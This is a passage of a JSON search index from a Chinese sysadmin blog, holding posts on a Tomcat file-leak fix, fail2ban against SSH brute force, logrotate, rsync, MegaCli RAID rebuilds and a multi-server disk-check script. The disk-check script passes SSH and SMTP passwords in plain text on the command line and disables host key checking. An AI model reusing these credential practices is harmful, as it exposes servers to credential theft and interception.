class=\"cl\"\u003e\u0026lt;Host \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eappBase\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e  改成  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Host \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eappBase\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;webapps\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eappBase千万不能为空\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改完后重启生效\u003c/p\u003e","title":"Tomcat配置不当导致文件泄露"},{"content":"用fail2ban简简单单封掉ssh端口的试探 有人不停试探登录22端口的openssh服务，ip量很大的话，比如1000多ip论番来，会导致服务的Loadavg升高到7左右，系统进程内ssh达到1000多，很困扰\n如果改掉sshd的缺省端口22，那么scp以及sftp的时候会带来很大麻烦\n这种情况就装个fail2ban就好，注意，Centos 7现在用的是fiewalld，所以fail2ban可以用ufw或者iptables，建议用iptables，比较容易看\n#安装 yum install -y epel-release yum install -y fail2ban 最主要的就是修改/etc/fail2ban/jail.conf\n#vi /etc/fail2ban/jail.conf ...... [sshd-iptalbes] enabled = true filter = sshd port = 22 action = iptables[name=SSH, port=ssh, protocol=tcp] logpath = /var/log/secure maxretry = 3 bantime = 86400 ...... 注意上面用的是iptables，三次尝试失败就ban一天。\n","permalink":"https://rendoumi.com/posts/20231228-fail2ban/","summary":"\u003ch4 id=\"用fail2ban简简单单封掉ssh端口的试探\"\u003e用fail2ban简简单单封掉ssh端口的试探\u003c/h4\u003e\n\u003cp\u003e有人不停试探登录22端口的openssh服务，ip量很大的话，比如1000多ip论番来，会导致服务的Loadavg升高到7左右，系统进程内ssh达到1000多，很困扰\u003c/p\u003e\n\u003cp\u003e如果改掉sshd的缺省端口22，那么scp以及sftp的时候会带来很大麻烦\u003c/p\u003e\n\u003cp\u003e这种情况就装个fail2ban就好，注意，Centos 7现在用的是fiewalld，所以fail2ban可以用ufw或者iptables，建议用iptables，比较容易看\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#安装\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y fail2ban\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最主要的就是修改/etc/fail2ban/jail.conf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vi /etc/fail2ban/jail.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esshd-iptalbes\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eenabled\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efilter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e sshd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e22\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eaction\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e iptables\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSSH, \u003cspan class=\"nv\"\u003eport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003essh, \u003cspan class=\"nv\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etcp\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elogpath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/log/secure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emaxretry\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebantime\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e86400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面用的是iptables，三次尝试失败就ban一天。\u003c/p\u003e","title":"用fail2ban简简单单封掉ssh端口的试探"},{"content":"用logrotate解决catalinna.out过大的问题 我们的tomcat的catalina.out基本运行一段时间后会出现文件过大的问题，处理一下。\n前提是/export/servers/tomcat/下需要建立个软链接tomcat，指向现在正在用的tomcat版本\n然后就可以用logrotate来解决catalina.out的日志轮转问题。这种方式比较简单。在/etc/logrotate.d/目录下新建一个名为tomcat的文件，\ncat \u0026gt;/etc/logrotate.d/tomcat \u0026lt;\u0026lt;EOF /export/servers/tomcat/tomcat/logs/catalina.out{ copytruncate daily rotate 7 missingok compress } EOF 以上的配置说明：\n/export/servers/tomcat/tomcat/logs/catalina.out{ # 要轮转的文件 copytruncate # 创建新的catalina.out副本后，truncate源catalina.out文件，会丢数据!!! daily # 每天进行catalina.out文件的轮转 rotate 7 # 至多保留7个副本 missingok # 如果要轮转的文件丢失了，继续轮转而不报错 compress # 使用压缩的方式（非常有用，节省硬盘空间；一个2~3GB的日志文件可以压缩成60MB左右） }\n可以手工强制执行logrotate程序。在命令行运行：\n","permalink":"https://rendoumi.com/posts/20231228-logrotate/","summary":"\u003ch4 id=\"用logrotate解决catalinnaout过大的问题\"\u003e用logrotate解决catalinna.out过大的问题\u003c/h4\u003e\n\u003cp\u003e我们的tomcat的catalina.out基本运行一段时间后会出现文件过大的问题，处理一下。\u003c/p\u003e\n\u003cp\u003e前提是/export/servers/tomcat/下需要建立个软链接tomcat，指向现在正在用的tomcat版本\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231228-logrotate/2021-06-18_110807.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就可以用logrotate来解决catalina.out的日志轮转问题。这种方式比较简单。在/etc/logrotate.d/目录下新建一个名为tomcat的文件，\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt;/etc/logrotate.d/tomcat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/export/servers/tomcat/tomcat/logs/catalina.out{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    copytruncate\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    daily\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    rotate 7\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    missingok\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    compress\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以上的配置说明：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e/export/servers/tomcat/tomcat/logs/catalina.out{ # 要轮转的文件\ncopytruncate  # 创建新的catalina.out副本后，truncate源catalina.out文件，会丢数据!!!\ndaily     # 每天进行catalina.out文件的轮转\nrotate 7   # 至多保留7个副本\nmissingok   # 如果要轮转的文件丢失了，继续轮转而不报错\ncompress   # 使用压缩的方式（非常有用，节省硬盘空间；一个2~3GB的日志文件可以压缩成60MB左右）\n}\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e可以手工强制执行logrotate程序。在命令行运行：\u003c/p\u003e","title":"用logrotate解决catalinna.out过大的问题"},{"content":"Rsync的基本参数 -a : 归档模式，递归拷贝，带属性。 -u : 同步时目标目录中如果某文件比源中文件时间要新，则保留不动。 -v : 详细显示信息 -z : 压缩 -h : 显示友好信息 -P : 显示传输进度百分比 -R : 使用相对路径，会保留源目录的目录结构。 -e : 使用ssh来传输 源如果没有/，代表连同目录以及目录下的文件，统统拷贝到目的去 源如果最后带/，意思是/*，代表只拷贝目录下的文件，不包括目录本身 如果参数中带-R，那无论源后面有无/，都按原有目录状态拷过去 -R 使用相对路径，会保留源目录的目录结构。 如rsync -av /foo/bar/baz.c remote::/tmp/，会将baz.c传到/tmp下， 而使用了-R，则在/tmp下的文件结构将会是foo/bar/baz.c。\n下面两种用法一样：\nrsync -auvPR --exclude \u0026#39;upload\u0026#39; new 172.18.34.38::new/ rsync -auvPR --exclude \u0026#39;upload\u0026#39; ./new 172.18.34.38::new/ 大规模传输细小文件的方法： find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -n 60 -I % -0 rsync -auvPR % 172.18.34.38::new/ -print0 -0 find命令有一个特别的参数-print0，指定输出的文件列表以null分隔。然后，xargs命令的-0参数表示用null当作分隔符。 -I -I指定每一项命令行参数的替代字符串。\n注意上面，从最底层开始，逐步向上同步。同步完第6个，然后第5个，4 3 2 1 \u0026hellip;\u0026hellip;\n最低的是第6层，每个文件价是一个日期，每个文件夹包含3000个文件左右。\n限速 rsync --bwlimit=500 bwlimit的单位是kb，所以500×8=4000kb=4000000，限速是4M（网络单位）\n借用ssh rsync -avzhe ssh backup.tar root@192.168.0.100:/backups/ ","permalink":"https://rendoumi.com/posts/20231228-rsync/","summary":"\u003ch4 id=\"rsync的基本参数\"\u003eRsync的基本参数\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-a : 归档模式，递归拷贝，带属性。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-u : 同步时目标目录中如果某文件比源中文件时间要新，则保留不动。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-v : 详细显示信息\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-z : 压缩\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-h : 显示友好信息\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-P : 显示传输进度百分比\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-R : 使用相对路径，会保留源目录的目录结构。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-e : 使用ssh来传输\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  源如果没有/，代表连同目录以及目录下的文件，统统拷贝到目的去\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  源如果最后带/，意思是/*，代表只拷贝目录下的文件，不包括目录本身\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  如果参数中带-R，那无论源后面有无/，都按原有目录状态拷过去\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e-R 使用相对路径，会保留源目录的目录结构。\n如rsync -av /foo/bar/baz.c remote::/tmp/，会将baz.c传到/tmp下，\n而使用了-R，则在/tmp下的文件结构将会是foo/bar/baz.c。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e下面两种用法一样：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -auvPR --exclude \u003cspan class=\"s1\"\u003e\u0026#39;upload\u0026#39;\u003c/span\u003e new 172.18.34.38::new/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -auvPR --exclude \u003cspan class=\"s1\"\u003e\u0026#39;upload\u0026#39;\u003c/span\u003e ./new 172.18.34.38::new/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"大规模传输细小文件的方法\"\u003e大规模传输细小文件的方法：\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind ./new -mindepth \u003cspan class=\"m\"\u003e6\u003c/span\u003e -maxdepth \u003cspan class=\"m\"\u003e6\u003c/span\u003e -type d -print0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e xargs -P \u003cspan class=\"m\"\u003e30\u003c/span\u003e -n \u003cspan class=\"m\"\u003e60\u003c/span\u003e -I % -0 rsync -auvPR % 172.18.34.38::new/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e-print0 -0 find命令有一个特别的参数-print0，指定输出的文件列表以null分隔。然后，xargs命令的-0参数表示用null当作分隔符。\n-I -I指定每一项命令行参数的替代字符串。\u003c/p\u003e","title":"Rsync的日常使用方法"},{"content":"192.168.85.7上面有两个Raid\n一个Raid1, 500G，应该是两块盘，现在丢了一块，正确的槽位不知道是哪一个 另一个是Raid0，4TB，运行正常\n现在在一个新槽位上插了一块硬盘，但是槽位不对，没有自动rebuild，状态是unconfiged good.\n首先查一下丢失的盘\n/opt/MegaRAID/MegaCli/MegaCli64 -Pdgetmissing -a0\r得到参数Array 0，Row 1\n首先进行替换，新盘的id是32:2，替换掉Array0 Row1的盘\n/opt/MegaRAID/MegaCli/MegaCli64 -PdReplaceMissing -PhysDrv [32:2] -Array0 -row1 -a0 然后强制这块新盘开始重建\n/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -PhysDrv [32:2] -a0 随时查看一下进度\n/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -PhysDrv [32:2] -a0 上面已经走了5%了，走完就ok了。\n","permalink":"https://rendoumi.com/posts/20231227-megacli_rebuild/","summary":"\u003cp\u003e192.168.85.7上面有两个Raid\u003c/p\u003e\n\u003cp\u003e一个Raid1, 500G，应该是两块盘，现在丢了一块，正确的槽位不知道是哪一个\n另一个是Raid0，4TB，运行正常\u003c/p\u003e\n\u003cp\u003e现在在一个新槽位上插了一块硬盘，但是槽位不对，没有自动rebuild，状态是unconfiged good.\u003c/p\u003e\n\u003cp\u003e首先查一下丢失的盘\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/opt/MegaRAID/MegaCli/MegaCli64 -Pdgetmissing -a0\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_112751.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到\u003cstrong\u003e参数Array 0，Row 1\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e首先进行替换，新盘的id是32:2，替换掉Array0 Row1的盘\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PdReplaceMissing -PhysDrv \u003cspan class=\"o\"\u003e[\u003c/span\u003e32:2\u003cspan class=\"o\"\u003e]\u003c/span\u003e -Array0 -row1 -a0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_113110.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后强制这块新盘开始重建\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -PhysDrv \u003cspan class=\"o\"\u003e[\u003c/span\u003e32:2\u003cspan class=\"o\"\u003e]\u003c/span\u003e -a0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_113250.png\"\u003e\u003c/p\u003e\n\u003cp\u003e随时查看一下进度\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -PhysDrv \u003cspan class=\"o\"\u003e[\u003c/span\u003e32:2\u003cspan class=\"o\"\u003e]\u003c/span\u003e -a0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_113429.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面已经走了5%了，走完就ok了。\u003c/p\u003e","title":"Megacli用来重建不知道正确槽位的Raid"},{"content":"适用于所有MegaCli的机器。无论dell、浪潮还是H3C。\n必须每天上午、下午各检查一下所有物理机的磁盘啊，有问题及时处理。\n172.18.31.2 /usr/local/bin/check_disk.sh 脚本：\nL1到L5，是5个机柜，从上到下是172.18.x.x的ip分布\n#!/bin/bash L1=(30.1 30.2 30.3 30.4 30.5 30.6 30.7 30.8 30.9 30.10 30.11 30.12 30.13 30.14 30.15 30.16 20.25 30.18) L2=(30.19 20.23 20.24 20.30 20.31 20.9 20.10 20.37 20.38 20.39 30.29 30.30 20.16 20.17 30.33 30.34 30.35 30.36) L3=(30.37 20.44 20.45 22.200 30.41 30.42 30.43 30.44 30.45 30.46 30.47 22.201 30.49 30.50 20.51 20.52 20.58 20.59) L4=(20.65 20.66 30.57 30.58 30.59 30.60 20.1 20.2 30.63 30.64 30.65 30.66 30.67 30.68 30.69 30.70 30.71 30.72) L5=(30.73 30.74 30.75 30.76) \u0026gt; /tmp/idrac.txt \u0026gt; /tmp/idracout.txt for i in L1 L2 L3 L4 L5 do var=$i[@] for j in ${!var} do echo \u0026#34;Scan $i 172.18.$j......\u0026#34; \u0026gt;\u0026gt; /tmp/idrac.txt sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.18.$j /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0|grep \u0026#34;S.M.A.R.T\u0026#34; \u0026gt;\u0026gt; /tmp/idrac.txt done done lines=($(grep -n \u0026#34;Yes\u0026#34; /tmp/idrac.txt | cut -f1 -d:)) if [ ${#lines[@]} -eq 0 ]; then exit 1 else for findline in ${lines[@]} do array=($(grep -n \u0026#34;\\.\\.\\.\\.\\.\\.\u0026#34; /tmp/idrac.txt |cut -f1 -d:)) newarray=(${array[*]} ${findline}) sortarray=($(echo ${newarray[@]} | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39;|sort -n)) for((i=0;i\u0026lt;${#sortarray[*]};i++)) do if [ ${sortarray[$i]} -eq $findline ];then beginline=${sortarray[(($i-1))]} endline=${sortarray[(($i+1))]} if [ \u0026#34;$endline\u0026#34; == \u0026#34;\u0026#34; ];then endline=\u0026#34;$\u0026#34; else endline=$(($endline-1)) fi break fi done sed -n \u0026#34;$beginline,$endline p\u0026#34; /tmp/idrac.txt \u0026gt;\u0026gt; /tmp/idracout.txt done /usr/local/bin/mailsend -to \u0026#34;zhangranrui@ddky.com\u0026#34; -from monit@ddky.com -ssl -port 465 -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u0026#34;IDC机器硬件故障\u0026#34; -v -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; -cs \u0026#34;gb2312\u0026#34; -enc-type \u0026#34;base64\u0026#34; -M \u0026#34;$(cat /tmp/idracout.txt)\u0026#34; fi ","permalink":"https://rendoumi.com/posts/20231227-megacli_disk/","summary":"\u003cp\u003e适用于所有MegaCli的机器。无论dell、浪潮还是H3C。\u003c/p\u003e\n\u003cp\u003e必须每天上午、下午各检查一下所有物理机的磁盘啊，有问题及时处理。\u003c/p\u003e\n\u003cp\u003e172.18.31.2  /usr/local/bin/check_disk.sh 脚本：\u003c/p\u003e\n\u003cp\u003eL1到L5，是5个机柜，从上到下是172.18.x.x的ip分布\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL1\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.1  30.2  30.3  30.4   30.5  30.6  30.7  30.8  30.9  30.10 30.11 30.12  30.13 30.14 30.15 30.16 20.25 30.18\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL2\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.19 20.23 20.24 20.30  20.31 20.9  20.10 20.37 20.38 20.39 30.29 30.30  20.16 20.17 30.33 30.34 30.35 30.36\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL3\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.37 20.44 20.45 22.200 30.41 30.42 30.43 30.44 30.45 30.46 30.47 22.201 30.49 30.50 20.51 20.52 20.58 20.59\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL4\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e20.65 20.66 30.57 30.58  30.59 30.60 20.1  20.2  30.63 30.64 30.65 30.66  30.67 30.68 30.69 30.70 30.71 30.72\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL5\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.73 30.74 30.75 30.76\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; /tmp/idrac.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; /tmp/idracout.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in L1 L2 L3 L4 L5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e@\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efor\u003c/span\u003e j in \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"p\"\u003e!var\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Scan \u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e 172.18.\u003c/span\u003e\u003cspan 